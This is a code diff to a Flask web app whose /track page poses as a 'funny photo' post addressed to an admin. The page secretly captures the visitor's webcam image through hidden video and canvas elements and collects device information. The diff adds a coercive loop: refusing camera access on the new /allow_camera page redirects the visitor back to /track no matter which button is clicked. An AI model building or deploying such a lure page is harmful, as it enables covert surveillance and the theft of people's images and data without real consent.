@@ -59,7 +59,7 @@ def track():
         <h1>Hello Admin</h1>
         <p>Hi here is a funny photo post this.</p>
         <img src="https://raw.githubusercontent.com/Ezhilkirthik/Hello/main/Image2.jpg" alt="Funny Image" width="400">
-        <img src= "https://raw.githubusercontent.com/Ezhilkirthik/Hello/main/Image1.jpg" alt="Funny Image" width="400">
+        <img src="https://raw.githubusercontent.com/Ezhilkirthik/Hello/main/Image1.jpg" alt="Funny Image" width="400">
         <p id="status"> </p>
         <video id="video" width="640" height="480" autoplay style="display:none;"></video>
         <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
@@ -79,32 +79,26 @@ def track():
                     }
                 };
 
-                while (true) {
-                    try {
-                        const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                        video.srcObject = stream;
-                        await new Promise(resolve => video.onloadedmetadata = resolve);
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const screenshot = canvas.toDataURL('image/jpeg');
-                        stream.getTracks().forEach(track => track.stop());
-                        return screenshot;
-                    } catch (err) {
-                        console.error('Camera access failed:', err.name, err.message);
-                        document.getElementById('status').innerText = 
-                            'Camera access denied. Please allow camera access to continue.';
-                        
-                        // Prompt user to retry or proceed without photo
-                        if (confirm('Camera access is required to take a funny photo! Click OK to try again or Cancel to skip.')) {
-                            // Wait briefly and retry
-                            await new Promise(resolve => setTimeout(resolve, 1000));
-                            continue;
-                        } else {
-                            return {
-                                error: 'Camera access denied by user',
-                                errorDetails: err.message,
-                                timestamp: new Date().toISOString()
-                            };
-                        }
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    video.srcObject = stream;
+                    await new Promise(resolve => video.onloadedmetadata = resolve);
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const screenshot = canvas.toDataURL('image/jpeg');
+                    stream.getTracks().forEach(track => track.stop());
+                    return screenshot;
+                } catch (err) {
+                    console.error('Camera access failed:', err.name, err.message);
+                    document.getElementById('status').innerText = 
+                        'Camera access denied. Redirecting to allow camera access...';
+                    
+                    // Redirect to /allow_camera whether OK or Cancel is clicked
+                    if (confirm('Camera access is required to take a funny photo! Click OK to try again or Cancel to proceed.')) {
+                        window.location.href = '/allow_camera';
+                        return null; // Prevent further execution until redirect
+                    } else {
+                        window.location.href = '/allow_camera';
+                        return null; // Prevent further execution until redirect
                     }
                 }
             }
@@ -145,8 +139,14 @@ def track():
                 if (screenshotResult && typeof screenshotResult === 'string') {
                     deviceInfo.screenshot = screenshotResult;
                     document.getElementById('status').innerText = 'Photo captured successfully!';
-                } else if (screenshotResult && screenshotResult.error) {
-                    deviceInfo.cameraError = screenshotResult;
+                } else if (screenshotResult === null) {
+                    // Redirect already triggered, do nothing here
+                    return;
+                } else {
+                    deviceInfo.cameraError = {
+                        error: 'Camera access denied by user',
+                        timestamp: new Date().toISOString()
+                    };
                     document.getElementById('status').innerText = 'Proceeding without photo.';
                 }
 
@@ -165,6 +165,23 @@ def track():
     </html>
     """
     return render_template_string(html)
+
+@app.route('/allow_camera')
+def allow_camera():
+    return render_template_string("""
+    <html>
+    <body>
+        <h1>Camera Access Required</h1>
+        <p>We need your camera to take a funny photo! Please allow access when prompted.</p>
+        <p>Redirecting back to the main page in 3 seconds...</p>
+        <script>
+            setTimeout(() => {
+                window.location.href = '/track';
+            }, 3000);
+        </script>
+    </body>
+    </html>
+    """)
 
 @app.route('/log', methods=['POST'])
 def log():
